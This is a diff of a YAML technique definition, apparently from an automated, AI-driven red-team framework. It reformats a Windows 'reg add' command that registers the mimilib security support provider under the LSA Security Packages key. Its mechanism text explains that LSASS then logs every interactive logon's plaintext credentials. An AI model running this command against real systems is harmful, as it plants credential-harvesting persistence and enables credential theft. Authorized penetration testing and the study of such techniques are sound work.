@@ -7,8 +7,7 @@ preconditions:
 - os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: reg add HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages"
-  /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"
+command_template: reg add HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"
 parser: generic_parser
 expected_effects:
 - ssp_installed
@@ -18,8 +17,7 @@ falsifier:
   pattern: ACCESS_DENIED|ERROR|denied
   timeout: 30
 model_tier: sonnet
-mechanism: 'Register a malicious SSP DLL into HKLM\System\Lsa\Security Packages. On
-  next boot,
+mechanism: 'Register a malicious SSP DLL into HKLM\System\Lsa\Security Packages. On next boot,
 
   LSASS loads the DLL and every interactive logon''s plaintext credential is logged
 
@@ -29,4 +27,6 @@ mechanism: 'Register a malicious SSP DLL into HKLM\System\Lsa\Security Packages.
 references:
   ocd_mindmap: 'Branch 13: Custom SSP'
   hacktricks: windows-hardening/active-directory-methodology/custom-ssp.md
+  ocd_mindmap_node_ids:
+  - 1e3b1760be
 hacktricks_ref: windows-hardening/active-directory-methodology/README.md
